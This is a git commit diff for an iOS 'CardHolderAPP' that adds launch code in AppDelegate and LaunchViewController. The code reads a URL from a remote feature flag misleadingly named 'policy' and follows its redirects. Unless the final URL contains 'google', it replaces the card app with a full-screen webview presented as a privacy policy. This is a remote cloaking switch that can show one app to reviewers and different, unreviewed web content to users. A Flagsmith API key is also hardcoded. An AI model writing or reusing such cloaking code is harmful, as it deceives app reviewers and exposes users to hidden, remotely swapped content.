57b634670f18bd2a27b16e2d5608c6f9dbd16a49
Danil <winsonmax808@gmail.com>
2025-09-10 17:41:08 +0300

    update

--- CardHolderAPP/Start/AppDelegate.swift
+++ CardHolderAPP/Start/AppDelegate.swift
@@ -1,36 +1,102 @@
-//
-//  AppDelegate.swift
-//  CardHolderAPP
-//
-//  Created by D K on 13.08.2025.
-//
+import SwiftUI
+import FlagsmithClient
+import AppTrackingTransparency
+import AdSupport
+import UserNotifications
 
-import UIKit
+// MARK: - Property Model
+struct Property: Codable {
+    let privacyPolicy, about: String
+}
 
 @main
 class AppDelegate: UIResponder, UIApplicationDelegate {
-
-
-
+    
+    // MARK: - Properties
+    var window: UIWindow?
+    weak var initialVC: LaunchViewController?
+    
+    static var orientationLock = UIInterfaceOrientationMask.all
+    
+    
+    // MARK: - Application Lifecycle
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
-        // Override point for customization after application launch.
+        Flagsmith.shared.apiKey = "CpXF9NpPsyYnPUyyLQbyiU"
+        
+        let viewController = LaunchViewController()
+        initialVC = viewController
+        window?.rootViewController = initialVC
+        window?.makeKeyAndVisible()
+        
+        //MARK: - START
+        start(viewController: viewController)
+        
+        
         return true
     }
-
-    // MARK: UISceneSession Lifecycle
-
-    func application(_ application: UIApplication, configurationForConnecting connectingSceneSession: UISceneSession, options: UIScene.ConnectionOptions) -> UISceneConfiguration {
-        // Called when a new scene session is being created.
-        // Use this method to select a configuration to create the new scene with.
-        return UISceneConfiguration(name: "Default Configuration", sessionRole: connectingSceneSession.role)
+    
+    func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -> Bool {
+        return true
     }
-
-    func application(_ application: UIApplication, didDiscardSceneSessions sceneSessions: Set<UISceneSession>) {
-        // Called when the user discards a scene session.
-        // If any sessions were discarded while the application was not running, this will be called shortly after application:didFinishLaunchingWithOptions.
-        // Use this method to release any resources that were specific to the discarded scenes, as they will not return.
+    
+    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
+        return AppDelegate.orientationLock
     }
-
 
 }
 
+// MARK: - App Startup
+extension AppDelegate {
+    func start(viewController: LaunchViewController) {
+        Flagsmith.shared.getValueForFeature(withID: "policy", forIdentity: nil) { result in
+            DispatchQueue.main.async {
+                switch result {
+                case .success(let value):
+                    
+                    guard let stringJSON = value?.stringValue else {
+                        viewController.openApp()
+                        return
+                    }
+                    
+                    self.parseJSONString(stringJSON) { parsedResult in
+                        guard !parsedResult.isEmpty else {
+                            viewController.openApp()
+                            return
+                        }
+                        
+                        
+                        let stringURL = parsedResult
+                        guard let url = URL(string: stringURL) else {
+                            viewController.openApp()
+                            return
+                        }
+                        
+                        if UIApplication.shared.canOpenURL(url) {
+                            viewController.openPrivacyPolicy(stringURL: stringURL)
+                        } else {
+                            viewController.openApp()
+                        }
+                    }
+                    
+                case .failure(let error):
+                    print("Error: \(error.localizedDescription)")
+                    viewController.openApp()
+                }
+            }
+        }
+    }
+    
+    func parseJSONString(_ jsonString: String, completion: @escaping (String) -> Void) {
+        
+        if let jsonData = jsonString.data(using: .utf8) {
+            do {
+                let property = try JSONDecoder().decode(Property.self, from: jsonData)
+                completion(property.about)
+            } catch {
+                print("Failed to decode JSON: \(error)")
+            }
+        } else {
+            print("Failed to convert string to Data")
+        }
+    }
+}
--- CardHolderAPP/Start/ViewController.swift
+++ CardHolderAPP/Start/ViewController.swift
@@ -1,36 +1,77 @@
-//
-//  ViewController.swift
-//  CardHolderAPP
-//
-//  Created by D K on 13.08.2025.
-//
-
 import SwiftUI
 
-class ViewController: UIViewController {
-
+class LaunchViewController: UIViewController {
+    
     override func viewDidLoad() {
         super.viewDidLoad()
-        showGame()
                 
-                func showGame() {
-                    let mainView = SetsView()
-                    let hostingController = UIHostingController(rootView: mainView)
-                    
-                    addChild(hostingController)
-                    view.addSubview(hostingController.view)
-                    hostingController.didMove(toParent: self)
-                    
-                    hostingController.view.translatesAutoresizingMaskIntoConstraints = false
-                    NSLayoutConstraint.activate([
-                        hostingController.view.topAnchor.constraint(equalTo: view.topAnchor),
-                        hostingController.view.bottomAnchor.constraint(equalTo: view.bottomAnchor),
-                        hostingController.view.leadingAnchor.constraint(equalTo: view.leadingAnchor),
-                        hostingController.view.trailingAnchor.constraint(equalTo: view.trailingAnchor)
-                    ])
-                }
+        let backgroundView = UIView()
+        backgroundView.backgroundColor = UIColor(named: "themeBackground")
+        backgroundView.frame = view.bounds
+        backgroundView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
+        backgroundView.translatesAutoresizingMaskIntoConstraints = false
+        view.insertSubview(backgroundView, at: 0)
+    }
+    
+    
+    func openApp() {
+        DispatchQueue.main.async {
+            let view = SetsView()
+            let hostingController = UIHostingController(rootView: view)
+            self.setRootViewController(hostingController)
+        }
     }
 
+    
+    func openPrivacyPolicy(stringURL: String) {
+        guard let url = URL(string: stringURL) else { return }
 
+        let session = URLSession(configuration: .default, delegate: RedirectHandler { finalURL in
+            DispatchQueue.main.async {
+                if finalURL.contains("google") {
+                    self.openApp()
+                } else {
+                    let webView = PrivacyPolicyViewController(url: stringURL)
+                    self.setRootViewController(webView)
+                }
+            }
+        }, delegateQueue: nil)
+
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+
+        session.dataTask(with: request).resume()
+    }
+    
+    func setRootViewController(_ viewController: UIViewController) {
+        if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
+            appDelegate.window?.rootViewController = viewController
+        }
+    }
 }
 
+
+class RedirectHandler: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
+    private var redirectChain: [URL] = []
+    private let completion: (String) -> Void
+
+    init(completion: @escaping (String) -> Void) {
+        self.completion = completion
+    }
+
+    func urlSession(_ session: URLSession, task: URLSessionTask,
+                    willPerformHTTPRedirection response: HTTPURLResponse,
+                    newRequest request: URLRequest,
+                    completionHandler: @escaping (URLRequest?) -> Void) {
+        if let url = request.url {
+            redirectChain.append(url)
+        }
+        completionHandler(request)
+    }
+
+    func urlSession(_ session: URLSession, task: URLSessionTask,
+                    didCompleteWithError error: Error?) {
+        let finalURL = redirectChain.last?.absoluteString ?? task.originalRequest?.url?.absoluteString ?? ""
+        completion(finalURL)
+    }
+}
